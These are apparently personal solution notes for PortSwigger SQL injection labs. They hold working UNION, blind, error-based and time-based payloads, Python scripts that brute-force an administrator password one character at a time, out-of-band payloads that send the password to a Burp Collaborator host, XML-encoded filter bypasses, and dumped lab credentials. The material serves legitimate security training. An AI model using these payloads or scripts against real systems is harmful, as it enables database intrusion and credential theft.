# SQL Injection

## Apprentice

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![](https://i.imgur.com/uuj7iWs.png)

`OR 1=1 --`

### SQL injection vulnerability allowing login bypass
https://portswigger.net/web-security/sql-injection/lab-login-bypass
 - username:`administrator' -- -`

## Practitioner

### SQL injection UNION attack, determining the number of columns returned by the query
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
 - `https://aced1fe51f9ab728c01a648000ee0000.web-security-academy.net/filter?category=Accessories%27%20union%20select%20null,null,null%20--`


### SQL injection UNION attack, finding a column containing text
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
`https://ac7a1f9f1e6af714c06e6ff300ff00ef.web-security-academy.net/filter?category=Accessories%27%20union%20select%20null,%27f8bj7z%27,null%20--`

### SQL injection UNION attack, retrieving data from other tables

![](https://i.imgur.com/EviixlF.jpg)

administrator
xa1z5d50eo7nw1tu11sv

### SQL injection UNION attack, retrieving multiple values in a single column
 ![](https://i.imgur.com/c8Al8wU.png)
administrator:0s3at2nwx0z3qdap2kya

### SQL injection attack, querying the database type and version on Oracle
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

https://0a4900b804831ea8c0e031d2002900da.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20banner,%20null%20FROM%20v$version%20--%20-


### SQL injection attack, querying the database type and version on MySQL and Microsoft

![](https://i.imgur.com/TkmqsHX.png)
![](https://i.imgur.com/eV5Wi1u.png)

### SQL injection attack, listing the database contents on non-Oracle databases
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

https://0a8a002803386db4c0ef4c9e008a00f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20%27header%27,table_name%20FROM%20information_schema.tables--
![](https://i.imgur.com/hYA6nta.png)
![](https://i.imgur.com/G3w9Xuh.png)
![](https://i.imgur.com/hn7H7mm.png)


https://0a8a002803386db4c0ef4c9e008a00f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20%27header%27,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_yunpot%27--
![](https://i.imgur.com/WrrBTvL.png)

https://0a8a002803386db4c0ef4c9e008a00f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20%27header%27,username_bysgbs%20FROM%20users_yunpot--
![](https://i.imgur.com/NjxDQqu.png)

https://0a8a002803386db4c0ef4c9e008a00f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20%27header%27,password_sndgby%20FROM%20users_yunpot--
![](https://i.imgur.com/6o0qSUN.png)

https://0a8a002803386db4c0ef4c9e008a00f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20%27header%27,username_bysgbs||%27:%27||password_sndgby%20FROM%20users_yunpot--

![](https://i.imgur.com/UjGwY0B.png)

x92yb6g8bn1pbzmj24n7

### SQL injection attack, listing the database contents on Oracle
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

https://0ad6005e03b6aea8c1bbf6f80048000f.web-security-academy.net/filter?category=category=Lifestyle%27%20UNION%20SELECT%20%27header%27,table_name%20FROM%20all_tables--

USERS_HZIRJO

https://0ad6005e03b6aea8c1bbf6f80048000f.web-security-academy.net/filter?category=category=Lifestyle%27%20UNION%20SELECT%20%27header%27,column_name%20FROM%20all_tab_columns--

USERNAME_RILCDM
PASSWORD_KIPXOT

https://0ad6005e03b6aea8c1bbf6f80048000f.web-security-academy.net/filter?category=category=Lifestyle%27%20UNION%20SELECT%20USERNAME_RILCDM,PASSWORD_KIPXOT%20FROM%20USERS_HZIRJO--
![](https://i.imgur.com/dmLSIaP.png)


### Blind SQL injection with conditional responses


https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
```
' UNION SELECT 'a' FROM users WHERE username='administrator' AND 1=1--
```

```python
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
import urllib.parse

delay = 5
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
q = lambda pos, char, entry,col,table,ordercol,condition: f"'; IF LOWER(SUBSTRING((SELECT {col} FROM {table} WHERE {condition} ORDER BY {ordercol} OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:{delay}'; --"

# Tables
#query = lambda pos,char,entry: q(pos,char,entry,"TABLE_NAME","information_schema.TABLES","TABLE_NAME", "1=1") #"COL", "TABLE", "CONDITION")
# Columns
query = lambda pos,char,entry: q(pos,char,entry,"COLUMN_NAME","information_schema.COLUMNS","COLUMN_NAME", "TABLE_NAME='users'") #"COL", "TABLE", "CONDITION")
# Usernames
#query = lambda pos,char,entry: q(pos,char,entry,"password_hash","users","username", "1=1") #"COL", "TABLE", "CONDITION")

query = lambda pos,char,entry: f"' UNION SELECT 'a' FROM users WHERE username='administrator' AND substring(password, {pos},1)='{char}'--"

print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789' # + string.punctuation

print("Running!")

for e in range(0,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                #r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=delay)
                cookies = {'TrackingId': urllib.parse.quote_plus(query(i,c,e))}
                r = requests.get("https://0ae3001d03cc1db3c0d7979500ba00f0.web-security-academy.net/", cookies=cookies)
                if "Welcome back" in r.text:
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    found = True
                    break
                #print(r.text);exit()
                if e==0 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
```

```
' UNION SELECT 'a' FROM users WHERE username='administrator' AND substring(password, 1,1)='1'--
Running!
bo5kgsj0n4n3rvmmaijq
bo5kgsj0n4n3rvmmaijq
bo5kgsj0n4n3rvmmaijq
bo5kgsj0n4n3rvmmaijq
bo5kgsj0n4n3rvmmaijq
```

### Blind SQL injection with conditional errors
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

`%27%2D%2D`

```
%27%20ORDER%20BY%201%2D%2D
%27%20UNION%20SELECT%20%27a%27%20FROM%20users%2D%2D
%27%20UNION%20SELECT%20password%20FROM%20users%2D%2D
' UNION SELECT (CASE WHEN (1=0) THEN CAST(1/1 AS CHAR) ELSE 'a' END) FROM users--
%27%20UNION%20SELECT%20%28CASE%20WHEN%20%281%3D0%29%20THEN%20CAST%281%2F0%20AS%20CHAR%29%20ELSE%20%27a%27%20END%29%20FROM%20users%2D%2D
```

```python=
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
import urllib.parse

delay = 2

q = lambda pos, char, entry,col,table,ordercol,condition: f"'; IF LOWER(SUBSTRING((SELECT {col} FROM {table} WHERE {condition} ORDER BY {ordercol} OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:{delay}'; --"
# Tables
#query = lambda pos,char,entry: q(pos,char,entry,"TABLE_NAME","information_schema.TABLES","TABLE_NAME", "1=1") #"COL", "TABLE", "CONDITION")
# Columns
query = lambda pos,char,entry: q(pos,char,entry,"COLUMN_NAME","information_schema.COLUMNS","COLUMN_NAME", "TABLE_NAME='users'") #"COL", "TABLE", "CONDITION")
# Usernames
#query = lambda pos,char,entry: q(pos,char,entry,"password_hash","users","username", "1=1") #"COL", "TABLE", "CONDITION")

query = lambda pos,char,entry: f"' UNION SELECT 'a' FROM users WHERE username='administrator' AND substring(password, {pos},1)='{char}'--"
query = lambda pos,char,entry: f"' UNION SELECT (CASE WHEN (substr(password, {pos},1)='{char}') THEN 'a' ELSE CAST(1/0 AS CHAR) END) FROM users WHERE username='administrator'--"
#query = lambda pos,char,entry: f"';SELECT CASE WHEN (substring((SELECT password from users WHERE username='administrator'),{pos},1)='{char}') THEN pg_sleep(8) ELSE pg_sleep(0) END--"

print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789' # + string.punctuation

print("Running!")

for e in range(0,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                #r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=delay)
                cookies = {'TrackingId': urllib.parse.quote_plus(query(i,c,e))}
                r = requests.get("https://0a1f009f03674b05c14cf690003f00c2.web-security-academy.net/", cookies=cookies, timeout=delay)
                if "Internal Server Error" not in r.text:
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    found = True
                    break
                #print(r.text);exit()
                if e==0 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
```

py6s0jxo74isafy3f6mf

```
' UNION SELECT (CASE WHEN (substr(password, 1,1)='1') THEN 'a' ELSE CAST(1/0 AS CHAR) END) FROM users WHERE username='administrator'--
Running!
py6s0jxo74isdzy3f6mf
py6
```

### Blind SQL injection with time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

`';SELECT pg_sleep(10)--`


### Blind SQL injection with time delays and information retrieval

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
```
';SELECT CASE WHEN (substr((SELECT password from users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(5) END--
```

```python=
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
import urllib.parse

delay = 5
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
q = lambda pos, char, entry,col,table,ordercol,condition: f"'; IF LOWER(SUBSTRING((SELECT {col} FROM {table} WHERE {condition} ORDER BY {ordercol} OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:{delay}'; --"

# Tables
#query = lambda pos,char,entry: q(pos,char,entry,"TABLE_NAME","information_schema.TABLES","TABLE_NAME", "1=1") #"COL", "TABLE", "CONDITION")
# Columns
query = lambda pos,char,entry: q(pos,char,entry,"COLUMN_NAME","information_schema.COLUMNS","COLUMN_NAME", "TABLE_NAME='users'") #"COL", "TABLE", "CONDITION")
# Usernames
#query = lambda pos,char,entry: q(pos,char,entry,"password_hash","users","username", "1=1") #"COL", "TABLE", "CONDITION")

query = lambda pos,char,entry: f"' UNION SELECT 'a' FROM users WHERE username='administrator' AND substring(password, {pos},1)='{char}'--"
query = lambda pos,char,entry: f"';SELECT CASE WHEN (substring((SELECT password from users WHERE username='administrator'),{pos},1)='{char}') THEN pg_sleep(8) ELSE pg_sleep(0) END--"

print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789' # + string.punctuation

print("Running!")

for e in range(0,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                #r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=delay)
                cookies = {'TrackingId': urllib.parse.quote_plus(query(i,c,e))}
                r = requests.get("https://0a5000360467da76c0cb03a9006300ca.web-security-academy.net/", cookies=cookies, timeout=delay)
                if "Welcome back" in r.text:
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    found = True
                    break
                #print(r.text);exit()
                if e==0 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")

```

```powershell
PS D:\Users\zunmu\Documents\Stuff\Work In Progress\Projects> py '.\time_based_sql.py'
';SELECT CASE WHEN (substring((SELECT password from users WHERE username='administrator'),1,1)='1') THEN pg_sleep(8) ELSE pg_sleep(0) END--
Running!
xqqj6lfi1d5vnof55uyw
```

xqqj6lfi1d5vnof55uyw

### Blind SQL injection with out-of-band interaction
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band


dgxhj8l3vb1aq615i35pw9gd248vwk.burpcollaborator.net
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://burpcollaborator.net/

Potential Payloads for out of band interaction
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burpcollaborator.net/"> %remote;]>'),'/l') FROM dual; -- -
'; SELECT UTL_INADDR.get_host_address(‘dgxhj8l3vb1aq615i35pw9gd248vwk.burpcollaborator.net) FROM dual;-- -
';exec master..xp_dirtree '//burpcollaborator.net/a'; -- -
';copy (SELECT '') to program 'nslookup burpcollaborator.net'; -- -
';LOAD_FILE('\\\\nslookup burpcollaborator.net\\a');SELECT ... INTO OUTFILE '\\\\nslookup burpcollaborator.net\a';-- -
```

```
%27%3Bcopy%20%28SELECT%20%27%27%29%20to%20program%20%27nslookup%20burpcollaborator.net%27%3B%20--%20-

%27%3BLOAD_FILE%28%27%5C%5C%5C%5Cnslookup%20burpcollaborator.net%5C%5Ca%27%29%3BSELECT%20...%20INTO%20OUTFILE%20%27%5C%5C%5C%5Cnslookup%20burpcollaborator.net%5Ca%27%3B--%20-
```

Solution - Checked Ans

`x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`


### Blind SQL injection with out-of-band data exfiltration
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

7u2k2p0pcj42mehq1bywoe9v2m8cw1.burpcollaborator.net

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

```x%27%20UNION%20SELECT%20EXTRACTVALUE%28xmltype%28%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F7u2k2p0pcj42mehq1bywoe9v2m8cw1.burpcollaborator.net%2F%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20FROM%20dual--
-> Worked

x%27%20UNION%20SELECT%20EXTRACTVALUE%28xmltype%28%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F%27%7C%7C%28SELECT%20password%20FROM%20users%20WHERE%20username%3D%27administrator%27%29%7C%7C%27.7u2k2p0pcj42mehq1bywoe9v2m8cw1.burpcollaborator.net%2F%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20FROM%20dual--
```
/
![](https://i.imgur.com/LcBbNKh.png)

zqem1rz5519l9ene3k2a


### SQL injection with filter bypass via XML encoding
https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

![](https://i.imgur.com/qDaZzqC.png)
![](https://i.imgur.com/ZqjWjyG.png)

```
1 &#x41;ND 1=1 &#x2d;&#x2d; &#x2d; -> Normal
1 &#x4f;RDER BY 1 &#x2d;&#x2d; &#x2d; -> Normal
1 &#x4f;RDER BY 1,2 &#x2d;&#x2d; &#x2d; -> 0
 
1 &#x55;NION &#x53;ELECT 1 &#x2d;&#x2d; &#x2d; -> 0

1 &#x4f;R 1=1 &#x2d;&#x2d; &#x2d; -> Multiple Entries
1 &#x4f;R 1=1 &#x55;NION &#x53;ELECT table_name FROM information_schema.tables &#x2d;&#x2d; - > Table names
```

![](https://i.imgur.com/luyz1qg.png)

`4 &#x55;NION &#x53;ELECT table_name FROM information_schema.tables &#x2d;&#x2d;`

![](https://i.imgur.com/oD5FA0z.png)
```
pg_extension pg_class pg_range pg_stat_gssapi pg_indexes pg_policies collation_character_set_applicability pg_stat_wal_receiver pg_prepared_statements pg_publication_tables constraint_table_usage pg_stat_database pg_statio_sys_tables pg_language pg_statio_all_sequences pg_statio_user_indexes pg_policy character_sets pg_stat_all_tables collations role_routine_grants foreign_data_wrapper_options check_constraint_routine_usage pg_ts_parser pg_depend sql_features pg_attribute foreign_server_options pg_ts_config routine_privileges pg_conversion pg_stat_user_indexes triggered_update_columns pg_stat_xact_all_tables pg_inherits usage_privileges attributes pg_statio_all_tables stock_level view_table_usage pg_stat_xact_user_functions table_constraints pg_largeobject_metadata pg_init_privs user_mapping_options user_defined_types pg_am foreign_table_options pg_default_acl pg_user_mappings enabled_roles pg_proc domain_udt_usage pg_locks pg_statistic_ext pg_prepared_xacts pg_auth_members pg_stat_user_functions pg_replication_slots pg_timezone_names pg_seclabels sql_packages pg_partitioned_table columns domains pg_stats pg_trigger pg_enum role_udt_grants schemata pg_pltemplate pg_collation element_types sql_languages pg_foreign_data_wrapper pg_statio_user_tables pg_tablespace data_type_privileges column_udt_usage column_column_usage pg_description pg_subscription pg_aggregate pg_stat_subscription pg_stat_database_conflicts pg_transform pg_views pg_shdepend pg_shseclabel pg_seclabel pg_amproc sql_sizing_profiles udt_privileges pg_ts_config_map pg_db_role_setting key_column_usage pg_sequences pg_stats_ext applicable_roles pg_group foreign_tables pg_sequence tables pg_statio_user_sequences pg_matviews foreign_data_wrappers administrable_role_authorizations pg_stat_user_tables role_column_grants pg_stat_archiver pg_tables pg_replication_origin pg_shdescription pg_statio_sys_indexes pg_ts_template pg_attrdef view_routine_usage pg_available_extension_versions pg_database pg_operator parameters views pg_stat_xact_user_tables pg_roles pg_stat_sys_indexes pg_stat_progress_create_index domain_constraints pg_subscription_rel pg_publication pg_foreign_table role_usage_grants referential_constraints column_privileges pg_ts_dict pg_opfamily pg_type view_column_usage pg_cursors information_schema_catalog_name sql_sizing pg_user pg_index triggers sql_implementation_info pg_rewrite routines column_domain_usage pg_constraint pg_settings users pg_stat_all_indexes role_table_grants pg_opclass pg_stat_progress_vacuum pg_available_extensions constraint_column_usage pg_namespace check_constraints pg_statio_sys_sequences pg_stat_sys_tables pg_amop pg_statio_all_indexes pg_event_trigger pg_stat_activity pg_stat_xact_sys_tables pg_foreign_server foreign_servers column_options user_mappings pg_timezone_abbrevs pg_rules pg_stat_replication pg_stat_bgwriter sequences pg_cast pg_publication_rel pg_stat_progress_cluster table_privileges products pg_stat_ssl
```

`4 &#x55;NION &#x53;ELECT column_name FROM information_schema.columns &#x2d;&#x2d;&#x57;HERE table_name='users'`

`4 &#x55;NION &#x53;ELECT column_name FROM information_schema.columns &#x57;HERE table_name=&#x27;users&#x27;&#x2d;&#x2d;`

```
password username
```

`4 &#x55;NION &#x53;ELECT username||&#x27;&#x3a;&#x27;||password FROM users &#x2d;&#x2d;`
```
administrator:v1m32hdvl2ay7n0qq3hf wiener:xx79ekk0r9iedv7mfvgr carlos:xpwxhaomqpc00w11gk87

```

![](https://i.imgur.com/EmNdKIk.png)


# Others